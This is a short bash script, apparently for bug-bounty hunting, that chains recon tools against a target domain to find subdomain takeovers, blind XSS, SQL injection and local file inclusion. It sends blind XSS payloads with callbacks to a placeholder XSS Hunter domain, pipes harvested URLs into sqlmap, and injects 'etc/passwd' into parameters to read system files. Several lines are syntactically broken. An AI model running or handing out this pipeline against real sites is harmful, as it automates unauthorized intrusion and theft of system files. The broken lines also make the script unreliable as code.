#! /bin/bash 

#Tools to have installed locally to run these scripts
#subfinder
#assetfinder
#amass 
#Gau(Get all urls)
#subjack
#uro
#dalfox
#anew 
#Waybackurls

#Finding Subdomain Takeovers
subfinder -d $1 >> file; assetfinder -subs-only $1; amass enum -norecursive -noalts -d $1; subjack -t 100 -timeout 30 -ssl >> result.txt

#Finding Blind XSS 
#Must have a xss.hunter account and domain
echo "{$1}"| gau -subs| sort -u| grep -v "png\|jpg\|css\|js|\gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind yourXSSHUNTERDomain.xss.ht

#Finding SQL injection
subfinder -d  $1 | httpx -silent| sort -u | anew | waybackurls| gf sqli >> sqli.txt
sqlmap -m sqli.txt --d

#Local File Inclusion
waybackurls $1 | sort -u | gf lfi | qsreplace "etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo Vuln! %"

